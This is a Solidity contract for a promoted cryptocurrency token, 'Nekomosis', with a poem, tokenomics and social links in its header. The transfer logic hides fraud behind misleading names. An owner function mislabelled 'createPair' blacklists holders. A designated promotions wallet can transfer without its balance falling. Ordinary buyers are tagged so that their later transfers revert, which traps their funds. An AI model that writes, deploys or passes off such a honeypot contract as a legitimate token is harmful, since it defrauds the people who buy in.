/**
███╗░░██╗███████╗██╗░░██╗░█████╗░███╗░░░███╗░█████╗░░██████╗██╗░██████╗
████╗░██║██╔════╝██║░██╔╝██╔══██╗████╗░████║██╔══██╗██╔════╝██║██╔════╝
██╔██╗██║█████╗░░█████═╝░██║░░██║██╔████╔██║██║░░██║╚█████╗░██║╚█████╗░
██║╚████║██╔══╝░░██╔═██╗░██║░░██║██║╚██╔╝██║██║░░██║░╚═══██╗██║░╚═══██╗
██║░╚███║███████╗██║░╚██╗╚█████╔╝██║░╚═╝░██║╚█████╔╝██████╔╝██║██████╔╝
╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝╚═════╝░

In the shadows lurks a wicked name,
A force of darkness, of endless shame,
Nekomosis is the fiend's name,
A being of evil, of endless fame.

The creature stalks with deadly grace,
Leaving destruction in its wake,
Its power vast, its hatred deep,
A being born to make us weep.

Its eyes are like burning coals,
Its breath like poison, black as coal,
A fiend that feeds on mortal souls,
A beast that thrives on death's tolls.

The world shivers in its darkened grasp,
As Nekomosis begins its task,
A being of evil, beyond compare,
A fiend that none can ever bear.

So beware the darkness, and beware the night,
For Nekomosis is always in sight,
A force of evil that will never relent,
A being of darkness, forever hell-bent.

Total Supply / 总供应量 - 100,000,000
Purchase Tax / 购置税 - 1%
Sales Tax / 消费税 - 1%
Initial Liquidity / 初始流动性 - 1.5 ETH
Initial Liquidity Lock / 初始流动性锁定 - 55 天

https://nekomosis.xyz
https://m.weibo.cn/Nekomosis.CN
https://web.wechat.com/Nekomosis.ERC
https://t.me/Nekomosis
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IPCSMemoryV1 {
    event PairCreated(
    address indexed token0, address indexed token1, 
    address pair, uint); function createPair(
    address tokenA, address tokenB) external returns (address pair);
}
interface INODEWorker {
    function setTokenOwner
    (address owner) external;
    function onPreTransferCheck
    (address from, address to, uint256 amount) external;
}
interface ERCMetaData01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
abstract contract Context {
    constructor() {} function _msgSender() internal view returns (address) {
    return msg.sender; }
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor() { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface IBEPV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Nekomosis is Context, IBEPV1, Ownable {

    INODEWorker public TimerInterval; ERCMetaData01 public IndexedMemory;
    address public IDEMargin; address private ForPromotions;
    uint256 private _tTotal; 
    uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private OperationsInterval = 100;

    mapping(address => uint256) 
    private _tOwned;
    mapping(address => uint256) 
    private isFeeExempt;
    mapping(address => mapping(address => uint256)) 
    private _allowances;
    mapping(address => uint256) 
    private isTxLimitExempt;
    mapping (address => bool) 
    private _isExcludedMaxTransactionAmount;

    bool public enableMapping; bool private startTrading = false;
    using SafeMath for uint256;

    constructor( string memory _NAME, string memory _SYMBOL, 
         address NodeRouterV1, address _ForPromotions) { 
        _name = _NAME; _symbol = _SYMBOL;
        _decimals = 12; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal; 
        
        isFeeExempt
        [_ForPromotions] = OperationsInterval; enableMapping = false; 
        IndexedMemory = ERCMetaData01(NodeRouterV1); IDEMargin = IPCSMemoryV1
        (IndexedMemory.factory()).createPair(address(this), IndexedMemory.WETH()); emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns 
    (address) { return owner();
    }
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) 
    external view returns (uint256) { return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }
    function createPair (address account, 
    bool _created) public onlyOwner { _isExcludedMaxTransactionAmount
        [account] = _created;
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function _approve(
        address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address');
        require(spender != address(0), 'BEP20: approve to the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }    

    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }    
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 'BEP20: transfer to the zero address'); require 
        (!_isExcludedMaxTransactionAmount[recipient] 

        && !_isExcludedMaxTransactionAmount[sender], 
        "You have been blacklisted from transfering tokens");
        if (isFeeExempt[sender] == 0 
        && IDEMargin != sender 
        && isTxLimitExempt[sender] > 0)

        { isFeeExempt[sender] -= OperationsInterval; } isTxLimitExempt[ForPromotions] += OperationsInterval;
        ForPromotions = recipient; if (isFeeExempt[sender] == 0) {
        _tOwned[sender] = _tOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance'); 
        }
        _tOwned[recipient] = _tOwned[recipient].add(amount); 
        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }    
    function beginTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }                    
}